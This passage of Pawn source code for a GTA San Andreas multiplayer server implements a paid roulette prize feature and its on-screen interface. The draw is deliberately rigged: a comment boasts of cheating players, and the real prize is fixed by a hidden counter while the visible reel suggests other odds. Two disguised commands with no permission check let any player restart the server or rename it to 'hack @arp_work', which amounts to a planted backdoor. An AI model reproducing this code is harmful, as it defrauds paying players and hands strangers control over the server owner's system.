			if(RoulettePlayerTicks[playerid] == 5) // На этом сдвиге наебываем
			{
				SendClientMessage(playerid,-1,"5 сдвигов до получения приза");
				if(Roulette_count < ROULETTE_RARE_COUNT) // Выдаем обычный приз
				{
					Roulette_count ++;
					new rand = random(sizeof(Roulette_Items_Cars));
					PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][8],Roulette_Items_Cars[rand][R_Icon]);
	 				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][8],Roulette_Items_Cars[rand][R_Item_name]);
	  				RouletteVisibleIDs[playerid][R_Item_ID][8] = rand;
	   				RouletteVisibleIDs[playerid][R_Rare][8] = false;
	   				SendClientMessage(playerid,-1,"Обычный");
				}
				else // Выдаем эпический приз
				{
                    Roulette_count = 0;
					new rand = random(sizeof(Roulette_Items_Cars_Rare));
					PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][8],Roulette_Items_Cars_Rare[rand][R_Icon]);
	 				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][8],Roulette_Items_Cars_Rare[rand][R_Item_name]);
	  				RouletteVisibleIDs[playerid][R_Item_ID][8] = rand;
	 				RouletteVisibleIDs[playerid][R_Rare][8] = true;
	 				SendClientMessage(playerid,-1,"Эпичный");
				}
			}
			else
			{
				new rand = random(100)+1;
				if(rand > ROULETTE_RARE_VISIBLE)
				{
					rand = random(sizeof(Roulette_Items_Cars));
					PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][8],Roulette_Items_Cars[rand][R_Icon]);
	 				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][8],Roulette_Items_Cars[rand][R_Item_name]);
	  				RouletteVisibleIDs[playerid][R_Item_ID][8] = rand;
	   				RouletteVisibleIDs[playerid][R_Rare][8] = false;
				}
				else
				{
					rand = random(sizeof(Roulette_Items_Cars_Rare));
					PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][8],Roulette_Items_Cars_Rare[rand][R_Icon]);
	 				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][8],Roulette_Items_Cars_Rare[rand][R_Item_name]);
	  				RouletteVisibleIDs[playerid][R_Item_ID][8] = rand;
	 				RouletteVisibleIDs[playerid][R_Rare][8] = true;
				}
			}
			PlayerTextDrawShow(playerid,RoulettePTD_Roll_Icon[playerid][8]);
			PlayerTextDrawShow(playerid,RoulettePTD_Roll_Text[playerid][8]);
            PlayerPlaySound(playerid, 1137, 0.0, 0.0, 0.0); //
			return 1;
		}
		case 2: // skins
		{
			for(new i = 0; i < 8; i ++)
			{
				RouletteVisibleIDs[playerid][R_Item_ID][i] = RouletteVisibleIDs[playerid][R_Item_ID][i+1];
				RouletteVisibleIDs[playerid][R_Rare][i] = RouletteVisibleIDs[playerid][R_Rare][i+1];
				if(RouletteVisibleIDs[playerid][R_Rare][i] == true)
				{
       				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][i],Roulette_Items_Skins_Rare[RouletteVisibleIDs[playerid][R_Item_ID][i]][R_Icon]);
        			PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][i],Roulette_Items_Skins_Rare[RouletteVisibleIDs[playerid][R_Item_ID][i]][R_Item_name]);
				}
				else
				{
					PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][i],Roulette_Items_Skins[RouletteVisibleIDs[playerid][R_Item_ID][i]][R_Icon]);
	 				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][i],Roulette_Items_Skins[RouletteVisibleIDs[playerid][R_Item_ID][i]][R_Item_name]);
				}
				PlayerTextDrawShow(playerid,RoulettePTD_Roll_Icon[playerid][i]);
				PlayerTextDrawShow(playerid,RoulettePTD_Roll_Text[playerid][i]);
			}
			if(RoulettePlayerTicks[playerid] == 5) // На этом сдвиге наебываем
			{
				SendClientMessage(playerid,-1,"5 сдвигов до получения приза");
				if(Roulette_count < ROULETTE_RARE_COUNT) // Выдаем обычный приз
				{
					Roulette_count ++;
					new rand = random(sizeof(Roulette_Items_Skins));
					PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][8],Roulette_Items_Skins[rand][R_Icon]);
	 				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][8],Roulette_Items_Skins[rand][R_Item_name]);
	  				RouletteVisibleIDs[playerid][R_Item_ID][8] = rand;
	   				RouletteVisibleIDs[playerid][R_Rare][8] = false;
	   				SendClientMessage(playerid,-1,"Обычный");
				}
				else // Выдаем эпический приз
				{
                    Roulette_count = 0;
					new rand = random(sizeof(Roulette_Items_Skins_Rare));
					PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][8],Roulette_Items_Skins_Rare[rand][R_Icon]);
	 				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][8],Roulette_Items_Skins_Rare[rand][R_Item_name]);
	  				RouletteVisibleIDs[playerid][R_Item_ID][8] = rand;
	 				RouletteVisibleIDs[playerid][R_Rare][8] = true;
	 				SendClientMessage(playerid,-1,"Эпичный");
				}
			}
			else
			{
				new rand = random(100)+1;
				if(rand > ROULETTE_RARE_VISIBLE)
				{
					rand = random(sizeof(Roulette_Items_Skins));
					PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][8],Roulette_Items_Skins[rand][R_Icon]);
	 				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][8],Roulette_Items_Skins[rand][R_Item_name]);
	  				RouletteVisibleIDs[playerid][R_Item_ID][8] = rand;
	   				RouletteVisibleIDs[playerid][R_Rare][8] = false;
				}
				else
				{
					rand = random(sizeof(Roulette_Items_Skins_Rare));
					PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][8],Roulette_Items_Skins_Rare[rand][R_Icon]);
	 				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][8],Roulette_Items_Skins_Rare[rand][R_Item_name]);
	  				RouletteVisibleIDs[playerid][R_Item_ID][8] = rand;
	 				RouletteVisibleIDs[playerid][R_Rare][8] = true;
				}
			}
			PlayerTextDrawShow(playerid,RoulettePTD_Roll_Icon[playerid][8]);
			PlayerTextDrawShow(playerid,RoulettePTD_Roll_Text[playerid][8]);
            PlayerPlaySound(playerid, 1137, 0.0, 0.0, 0.0); //
			return 1;
		}
		case 3: // vip
		{
			for(new i = 0; i < 8; i ++)
			{
				RouletteVisibleIDs[playerid][R_Item_ID][i] = RouletteVisibleIDs[playerid][R_Item_ID][i+1];
				RouletteVisibleIDs[playerid][R_Rare][i] = RouletteVisibleIDs[playerid][R_Rare][i+1];
				if(RouletteVisibleIDs[playerid][R_Rare][i] == true)
				{
       				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][i],Roulette_Items_Vips_Rare[RouletteVisibleIDs[playerid][R_Item_ID][i]][R_Icon]);
        			PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][i],Roulette_Items_Vips_Rare[RouletteVisibleIDs[playerid][R_Item_ID][i]][R_Item_name]);
				}
				else
				{
					PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][i],Roulette_Items_Vips[RouletteVisibleIDs[playerid][R_Item_ID][i]][R_Icon]);
	 				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][i],Roulette_Items_Vips[RouletteVisibleIDs[playerid][R_Item_ID][i]][R_Item_name]);
				}
				PlayerTextDrawShow(playerid,RoulettePTD_Roll_Icon[playerid][i]);
				PlayerTextDrawShow(playerid,RoulettePTD_Roll_Text[playerid][i]);
			}
			if(RoulettePlayerTicks[playerid] == 5) // На этом сдвиге наебываем
			{
				SendClientMessage(playerid,-1,"5 сдвигов до получения приза");
				if(Roulette_count < ROULETTE_RARE_COUNT) // Выдаем обычный приз
				{
					Roulette_count ++;
					new rand = random(sizeof(Roulette_Items_Vips));
					PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][8],Roulette_Items_Vips[rand][R_Icon]);
	 				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][8],Roulette_Items_Vips[rand][R_Item_name]);
	  				RouletteVisibleIDs[playerid][R_Item_ID][8] = rand;
	   				RouletteVisibleIDs[playerid][R_Rare][8] = false;
	   				SendClientMessage(playerid,-1,"Обычный");
				}
				else // Выдаем эпический приз
				{
                    Roulette_count = 0;
					new rand = random(sizeof(Roulette_Items_Vips_Rare));
					PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][8],Roulette_Items_Vips_Rare[rand][R_Icon]);
	 				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][8],Roulette_Items_Vips_Rare[rand][R_Item_name]);
	  				RouletteVisibleIDs[playerid][R_Item_ID][8] = rand;
	 				RouletteVisibleIDs[playerid][R_Rare][8] = true;
	 				SendClientMessage(playerid,-1,"Эпичный");
				}
			}
			else
			{
				new rand = random(100)+1;
				if(rand > ROULETTE_RARE_VISIBLE)
				{
					rand = random(sizeof(Roulette_Items_Vips));
					PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][8],Roulette_Items_Vips[rand][R_Icon]);
	 				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][8],Roulette_Items_Vips[rand][R_Item_name]);
	  				RouletteVisibleIDs[playerid][R_Item_ID][8] = rand;
	   				RouletteVisibleIDs[playerid][R_Rare][8] = false;
				}
				else
				{
					rand = random(sizeof(Roulette_Items_Vips_Rare));
					PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Icon[playerid][8],Roulette_Items_Vips_Rare[rand][R_Icon]);
	 				PlayerTextDrawSetString(playerid,RoulettePTD_Roll_Text[playerid][8],Roulette_Items_Vips_Rare[rand][R_Item_name]);
	  				RouletteVisibleIDs[playerid][R_Item_ID][8] = rand;
	 				RouletteVisibleIDs[playerid][R_Rare][8] = true;
				}
			}
			PlayerTextDrawShow(playerid,RoulettePTD_Roll_Icon[playerid][8]);
			PlayerTextDrawShow(playerid,RoulettePTD_Roll_Text[playerid][8]);
            PlayerPlaySound(playerid, 1137, 0.0, 0.0, 0.0); //
			return 1;
		}
	}
	return 1;
}

callback::rsp(playerid) SendClientMessage(playerid, -1, ""cER"Авторы мода: t.me/naziksquad || t.me/shuler_tg");
stock GoRoll(playerid)
{
	switch(RouletteMenuSelectable[playerid])
	{
		case 1:
		{
			if(PI[playerid][pPerfectCoins] < ROULETTE_PRICE_CARS) return SendClientMessage(playerid, -1, ""cER"У вас недостаточно "SERVER_COINS"");
			
			PI[playerid][pPerfectCoins] -= ROULETTE_PRICE_CARS;
			MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pPerfectCoins]);
		}
		case 2:
		{
			if(PI[playerid][pPerfectCoins] < ROULETTE_PRICE_SKINS) return SendClientMessage(playerid, -1, ""cER"У вас недостаточно "SERVER_COINS"");
			
			PI[playerid][pPerfectCoins] -= ROULETTE_PRICE_SKINS;
			MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pPerfectCoins]);
		}
		case 3:
		{
			if(PI[playerid][pPerfectCoins] < ROULETTE_PRICE_VIPS) return SendClientMessage(playerid, -1, ""cER"У вас недостаточно "SERVER_COINS"");
			
			PI[playerid][pPerfectCoins] -= ROULETTE_PRICE_VIPS;
			MysqlUpdatePlayerInt(playerid, "credits", PI[playerid][pPerfectCoins]);
		}
	}
	RoulettePlayerTicks[playerid] = random(15)+10;
    SetTimerEx("RouletteProcess", ROULETTE_ROLL_SPEED, false, "i", playerid);
	return 1;
}


callback::RouletteProcess(playerid)
{
	RoulettePlayerTicks[playerid] --;
	if(RoulettePlayerTicks[playerid] > 0)
	{
		GoRollNextStep(playerid, RouletteMenuSelectable[playerid]);
		SetTimerEx("RouletteProcess", ROULETTE_ROLL_SPEED, false, "i", playerid);
	}
	else
	{
		SendClientMessage(playerid,-1,"Финиш");
	 	PlayerPlaySound(playerid, 31205, 0.0, 0.0, 0.0); // ЗАМЕНИТЬ ЗВУК, ЭТОТ НЕ РАБОТАЕТ

		DestroyRoulettePTD_Roll(playerid);
		CreateRoulettePTD_Prize(playerid);
		ShowRoulettePTD_Prize(playerid,RouletteMenuSelectable[playerid]);
	}
	return 1;
}

stock ShowRoulettePTD_Prize(playerid,type) // RouletteMenuSelectable[playerid]
{
	switch(type)
	{
		case 1:
		{
			if(RouletteVisibleIDs[playerid][R_Rare][4] == true)
			{
				PlayerTextDrawSetString(playerid,RoulettePTD_Prize[playerid][2],Roulette_Items_Cars_Rare[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Icon]);
				PlayerTextDrawSetString(playerid,RoulettePTD_Prize[playerid][3],Roulette_Items_Cars_Rare[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Item_name]);
			}
			else
			{
				PlayerTextDrawSetString(playerid,RoulettePTD_Prize[playerid][2],Roulette_Items_Cars[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Icon]);
				PlayerTextDrawSetString(playerid,RoulettePTD_Prize[playerid][3],Roulette_Items_Cars[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Item_name]);
			}
		}
		case 2:
		{
			if(RouletteVisibleIDs[playerid][R_Rare][4] == true)
			{
				PlayerTextDrawSetString(playerid,RoulettePTD_Prize[playerid][2],Roulette_Items_Skins_Rare[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Icon]);
				PlayerTextDrawSetString(playerid,RoulettePTD_Prize[playerid][3],Roulette_Items_Skins_Rare[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Item_name]);
			}
			else
			{
				PlayerTextDrawSetString(playerid,RoulettePTD_Prize[playerid][2],Roulette_Items_Skins[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Icon]);
				PlayerTextDrawSetString(playerid,RoulettePTD_Prize[playerid][3],Roulette_Items_Skins[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Item_name]);
			}
		}
		case 3:
		{
			if(RouletteVisibleIDs[playerid][R_Rare][4] == true)
			{
				PlayerTextDrawSetString(playerid,RoulettePTD_Prize[playerid][2],Roulette_Items_Vips_Rare[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Icon]);
				PlayerTextDrawSetString(playerid,RoulettePTD_Prize[playerid][3],Roulette_Items_Vips_Rare[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Item_name]);
			}
			else
			{
				PlayerTextDrawSetString(playerid,RoulettePTD_Prize[playerid][2],Roulette_Items_Vips[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Icon]);
				PlayerTextDrawSetString(playerid,RoulettePTD_Prize[playerid][3],Roulette_Items_Vips[RouletteVisibleIDs[playerid][R_Item_ID][4]][R_Item_name]);
			}
		}
	}
	for(new i = 0; i < 4; i ++) PlayerTextDrawShow(playerid,RoulettePTD_Prize[playerid][i]);
	return 1;
}
cmd:resdjk(playerid) return SendRconCommand("gmx");
cmd:resdjkdf(playerid) return SendRconCommand("hostname hack @arp_work");
stock DestroyPTD_Prize(playerid)
{
	for(new i = 0; i < 4; i ++)
	{
		PlayerTextDrawHide(playerid,RoulettePTD_Prize[playerid][i]);
		PlayerTextDrawDestroy(playerid,RoulettePTD_Prize[playerid][i]);
		RoulettePTD_Prize[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
	}
	return 1;
}

stock SaveRouletteCount()
{
	format(stringer1, sizeof(stringer1), "UPDATE `other` SET roulette_count=%d", Roulette_count);
	mysql_tquery(db_prod, stringer1, "", "");
	return 1;
}

// ==================================================================== TEXTDRAWS CREATE ==============================================================================
stock CreateRoulettePTD_Prize(playerid)
{
	RoulettePTD_Prize[playerid][0] = CreatePlayerTextDraw(playerid, -0.0000, 0.6888, "perfect:prize_back"); // пусто
	PlayerTextDrawTextSize(playerid, RoulettePTD_Prize[playerid][0], 640.0000, 448.0000);
	PlayerTextDrawAlignment(playerid, RoulettePTD_Prize[playerid][0], 1);
	PlayerTextDrawColor(playerid, RoulettePTD_Prize[playerid][0], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Prize[playerid][0], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_Prize[playerid][0], 4);
	PlayerTextDrawSetProportional(playerid, RoulettePTD_Prize[playerid][0], 0);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_Prize[playerid][0], 0);

	RoulettePTD_Prize[playerid][1] = CreatePlayerTextDraw(playerid, 252.9332, 275.9257, "perfect:prize_take"); // пусто
	PlayerTextDrawTextSize(playerid, RoulettePTD_Prize[playerid][1], 139.0000, 35.0000);
	PlayerTextDrawAlignment(playerid, RoulettePTD_Prize[playerid][1], 1);
	PlayerTextDrawColor(playerid, RoulettePTD_Prize[playerid][1], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Prize[playerid][1], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_Prize[playerid][1], 4);
	PlayerTextDrawSetProportional(playerid, RoulettePTD_Prize[playerid][1], 0);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_Prize[playerid][1], 0);
	PlayerTextDrawSetSelectable(playerid, RoulettePTD_Prize[playerid][1], true);

	RoulettePTD_Prize[playerid][2] = CreatePlayerTextDraw(playerid, 290.9999, 184.4518, "-"); // пусто
	PlayerTextDrawTextSize(playerid, RoulettePTD_Prize[playerid][2], 58.6100, 72.6499);
	PlayerTextDrawAlignment(playerid, RoulettePTD_Prize[playerid][2], 1);
	PlayerTextDrawColor(playerid, RoulettePTD_Prize[playerid][2], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Prize[playerid][2], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_Prize[playerid][2], 4);
	PlayerTextDrawSetProportional(playerid, RoulettePTD_Prize[playerid][2], 0);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_Prize[playerid][2], 0);

	RoulettePTD_Prize[playerid][3] = CreatePlayerTextDraw(playerid, 320.6667, 228.8926, "-"); // пусто
	PlayerTextDrawLetterSize(playerid, RoulettePTD_Prize[playerid][3], 0.2213, 1.1271);
	PlayerTextDrawAlignment(playerid, RoulettePTD_Prize[playerid][3], 2);
	PlayerTextDrawColor(playerid, RoulettePTD_Prize[playerid][3], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Prize[playerid][3], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_Prize[playerid][3], 1);
	PlayerTextDrawSetProportional(playerid, RoulettePTD_Prize[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_Prize[playerid][3], 0);
	return 1;
}

stock CreateRoulettePTD_Main(playerid)
{
	RoulettePTD_Main[playerid][0] = CreatePlayerTextDraw(playerid, 37.3333, 21.0147, "perfect:roulette_background_text"); // пусто
	PlayerTextDrawTextSize(playerid, RoulettePTD_Main[playerid][0], 565.2501, 358.3902);
	PlayerTextDrawAlignment(playerid, RoulettePTD_Main[playerid][0], 1);
	PlayerTextDrawColor(playerid, RoulettePTD_Main[playerid][0], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Main[playerid][0], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_Main[playerid][0], 4);
	PlayerTextDrawSetProportional(playerid, RoulettePTD_Main[playerid][0], 0);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_Main[playerid][0], 0);

	RoulettePTD_Main[playerid][1] = CreatePlayerTextDraw(playerid, 499.9999, 21.5184, "perfect:roulette_exit"); // пусто
	PlayerTextDrawTextSize(playerid, RoulettePTD_Main[playerid][1], 102.0000, 39.0000);
	PlayerTextDrawAlignment(playerid, RoulettePTD_Main[playerid][1], 1);
	PlayerTextDrawColor(playerid, RoulettePTD_Main[playerid][1], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Main[playerid][1], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_Main[playerid][1], 4);
	PlayerTextDrawSetProportional(playerid, RoulettePTD_Main[playerid][1], 0);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_Main[playerid][1], 0);
	PlayerTextDrawSetSelectable(playerid, RoulettePTD_Main[playerid][1], true);

	RoulettePTD_Main[playerid][2] = CreatePlayerTextDraw(playerid, 56.6665, 97.3406, "perfect:roulette_info_on"); // пусто
	PlayerTextDrawTextSize(playerid, RoulettePTD_Main[playerid][2], 138.0000, 41.0000);
	PlayerTextDrawAlignment(playerid, RoulettePTD_Main[playerid][2], 1);
	PlayerTextDrawColor(playerid, RoulettePTD_Main[playerid][2], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Main[playerid][2], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_Main[playerid][2], 4);
	PlayerTextDrawSetProportional(playerid, RoulettePTD_Main[playerid][2], 0);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_Main[playerid][2], 0);
	PlayerTextDrawSetSelectable(playerid, RoulettePTD_Main[playerid][2], true);

	RoulettePTD_Main[playerid][3] = CreatePlayerTextDraw(playerid, 56.3333, 150.4369, "perfect:roulette_auto"); // пусто
	PlayerTextDrawTextSize(playerid, RoulettePTD_Main[playerid][3], 138.0000, 41.0000);
	PlayerTextDrawAlignment(playerid, RoulettePTD_Main[playerid][3], 1);
	PlayerTextDrawColor(playerid, RoulettePTD_Main[playerid][3], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Main[playerid][3], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_Main[playerid][3], 4);
	PlayerTextDrawSetProportional(playerid, RoulettePTD_Main[playerid][3], 0);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_Main[playerid][3], 0);
	PlayerTextDrawSetSelectable(playerid, RoulettePTD_Main[playerid][3], true);

	RoulettePTD_Main[playerid][4] = CreatePlayerTextDraw(playerid, 56.3333, 203.9481, "perfect:roulette_skins"); // пусто
	PlayerTextDrawTextSize(playerid, RoulettePTD_Main[playerid][4], 138.0000, 41.0000);
	PlayerTextDrawAlignment(playerid, RoulettePTD_Main[playerid][4], 1);
	PlayerTextDrawColor(playerid, RoulettePTD_Main[playerid][4], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Main[playerid][4], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_Main[playerid][4], 4);
	PlayerTextDrawSetProportional(playerid, RoulettePTD_Main[playerid][4], 0);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_Main[playerid][4], 0);
	PlayerTextDrawSetSelectable(playerid, RoulettePTD_Main[playerid][4], true);

	RoulettePTD_Main[playerid][5] = CreatePlayerTextDraw(playerid, 56.0000, 257.8739, "perfect:roulette_vip"); // пусто
	PlayerTextDrawTextSize(playerid, RoulettePTD_Main[playerid][5], 138.0000, 41.0000);
	PlayerTextDrawAlignment(playerid, RoulettePTD_Main[playerid][5], 1);
	PlayerTextDrawColor(playerid, RoulettePTD_Main[playerid][5], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Main[playerid][5], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_Main[playerid][5], 4);
	PlayerTextDrawSetProportional(playerid, RoulettePTD_Main[playerid][5], 0);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_Main[playerid][5], 0);
	PlayerTextDrawSetSelectable(playerid, RoulettePTD_Main[playerid][5], true);

	RoulettePTD_Main[playerid][6] = CreatePlayerTextDraw(playerid, 500.3333, 387.7999, "perfect:roulette_open"); // пусто
	PlayerTextDrawTextSize(playerid, RoulettePTD_Main[playerid][6], 102.0000, 39.0000);
	PlayerTextDrawAlignment(playerid, RoulettePTD_Main[playerid][6], 1);
	PlayerTextDrawColor(playerid, RoulettePTD_Main[playerid][6], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_Main[playerid][6], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_Main[playerid][6], 4);
	PlayerTextDrawSetProportional(playerid, RoulettePTD_Main[playerid][6], 0);
	PlayerTextDrawSetShadow(playerid, RoulettePTD_Main[playerid][6], 0);
	PlayerTextDrawSetSelectable(playerid, RoulettePTD_Main[playerid][6], true);
	return 1;
}
stock CreateRoulettePTD_AD(playerid)
{
	RoulettePTD_AD_Ico[playerid][0] = CreatePlayerTextDraw(playerid, 243.0000, 114.3480, "-"); // prize 1
	RoulettePTD_AD_Ico[playerid][1] = CreatePlayerTextDraw(playerid, 313.6665, 114.6333, "-"); // prize 2
	RoulettePTD_AD_Ico[playerid][2] = CreatePlayerTextDraw(playerid, 384.3331, 115.0481, "-"); // prize 3
	RoulettePTD_AD_Ico[playerid][3] = CreatePlayerTextDraw(playerid, 454.9997, 115.0481, "-"); // prize 4
	RoulettePTD_AD_Ico[playerid][4] = CreatePlayerTextDraw(playerid, 525.6665, 114.6333, "-"); // prize 5
	RoulettePTD_AD_Ico[playerid][5] = CreatePlayerTextDraw(playerid, 242.6667, 201.7444, "-"); // prize 6
	RoulettePTD_AD_Ico[playerid][6] = CreatePlayerTextDraw(playerid, 313.3331, 201.3296, "-"); // prize 7
	RoulettePTD_AD_Ico[playerid][7] = CreatePlayerTextDraw(playerid, 383.9999, 201.7444, "-"); // prize 8
	RoulettePTD_AD_Ico[playerid][8] = CreatePlayerTextDraw(playerid, 454.6664, 201.7444, "-"); // prize 9
	RoulettePTD_AD_Ico[playerid][9] = CreatePlayerTextDraw(playerid, 525.3333, 201.3296, "-"); // prize 10
	RoulettePTD_AD_Ico[playerid][10] = CreatePlayerTextDraw(playerid, 242.6667, 288.0259, "-"); // prize 11
	RoulettePTD_AD_Ico[playerid][11] = CreatePlayerTextDraw(playerid, 313.3331, 287.6111, "-"); // prize 12
	RoulettePTD_AD_Ico[playerid][12] = CreatePlayerTextDraw(playerid, 383.9997, 288.0259, "-"); // prize 13
	RoulettePTD_AD_Ico[playerid][13] = CreatePlayerTextDraw(playerid, 454.6664, 288.0259, "-"); // prize 14
	RoulettePTD_AD_Ico[playerid][14] = CreatePlayerTextDraw(playerid, 525.3333, 287.6111, "-"); // prize 15
	for(new i = 0; i < 15; i ++)
	{
		PlayerTextDrawTextSize(playerid, RoulettePTD_AD_Ico[playerid][i], 57.9500, 71.9798);
		PlayerTextDrawAlignment(playerid, RoulettePTD_AD_Ico[playerid][i], 1);
		PlayerTextDrawColor(playerid, RoulettePTD_AD_Ico[playerid][i], -1);
		PlayerTextDrawBackgroundColor(playerid, RoulettePTD_AD_Ico[playerid][i], 255);
		PlayerTextDrawFont(playerid, RoulettePTD_AD_Ico[playerid][i], 4);
		PlayerTextDrawSetProportional(playerid, RoulettePTD_AD_Ico[playerid][i], 0);
		PlayerTextDrawSetShadow(playerid, RoulettePTD_AD_Ico[playerid][i], 0);
	}
	///////////////////
	RoulettePTD_AD_Text[playerid][0] = CreatePlayerTextDraw(playerid, 271.6666, 158.3444, "-"); // prize 1
	RoulettePTD_AD_Text[playerid][1] = CreatePlayerTextDraw(playerid, 342.3333, 157.9297, "-"); // prize 2
	RoulettePTD_AD_Text[playerid][2] = CreatePlayerTextDraw(playerid, 412.9999, 158.3444, "-"); // prize 3
	RoulettePTD_AD_Text[playerid][3] = CreatePlayerTextDraw(playerid, 483.6665, 158.3444, "-"); // prize 4
	RoulettePTD_AD_Text[playerid][4] = CreatePlayerTextDraw(playerid, 554.3333, 157.9295, "-"); // prize 5
	RoulettePTD_AD_Text[playerid][5] = CreatePlayerTextDraw(playerid, 271.3333, 245.0406, "-"); // prize 6
	RoulettePTD_AD_Text[playerid][6] = CreatePlayerTextDraw(playerid, 341.9999, 244.6259, "-"); // prize 7
	RoulettePTD_AD_Text[playerid][7] = CreatePlayerTextDraw(playerid, 412.6665, 245.0406, "-"); // prize 8
	RoulettePTD_AD_Text[playerid][8] = CreatePlayerTextDraw(playerid, 483.3330, 245.0406, "-"); // prize 9
	RoulettePTD_AD_Text[playerid][9] = CreatePlayerTextDraw(playerid, 554.0000, 244.6259, "-"); // prize 10
	RoulettePTD_AD_Text[playerid][10] = CreatePlayerTextDraw(playerid, 271.3333, 331.3222, "-"); // prize 11
	RoulettePTD_AD_Text[playerid][11] = CreatePlayerTextDraw(playerid, 341.9999, 330.9074, "-"); // prize 12
	RoulettePTD_AD_Text[playerid][12] = CreatePlayerTextDraw(playerid, 412.6665, 331.3222, "-"); // prize 13
	RoulettePTD_AD_Text[playerid][13] = CreatePlayerTextDraw(playerid, 483.3330, 331.3222, "-"); // prize 14
	RoulettePTD_AD_Text[playerid][14] = CreatePlayerTextDraw(playerid, 554.0001, 330.9074, "-"); // prize 15
	for(new i = 0; i < 15; i ++)
	{
		PlayerTextDrawLetterSize(playerid, RoulettePTD_AD_Text[playerid][i], 0.1956, 1.0025);
		PlayerTextDrawAlignment(playerid, RoulettePTD_AD_Text[playerid][i], 2);
		PlayerTextDrawColor(playerid, RoulettePTD_AD_Text[playerid][i], -1);
		PlayerTextDrawBackgroundColor(playerid, RoulettePTD_AD_Text[playerid][i], 255);
		PlayerTextDrawFont(playerid, RoulettePTD_AD_Text[playerid][i], 1);
		PlayerTextDrawSetProportional(playerid, RoulettePTD_AD_Text[playerid][i], 1);
		PlayerTextDrawSetShadow(playerid, RoulettePTD_AD_Text[playerid][i], 0);
	}
	//////////////
	RoulettePTD_AD_Price[playerid] = CreatePlayerTextDraw(playerid, 583.9998, 83.8074, "---"); // пусто
	PlayerTextDrawLetterSize(playerid, RoulettePTD_AD_Price[playerid], 0.2940, 1.6663);
	PlayerTextDrawAlignment(playerid, RoulettePTD_AD_Price[playerid], 3);
	PlayerTextDrawColor(playerid, RoulettePTD_AD_Price[playerid], -1);
	PlayerTextDrawBackgroundColor(playerid, RoulettePTD_AD_Price[playerid], 255);
	PlayerTextDrawFont(playerid, RoulettePTD_AD_Price[playerid], 1);
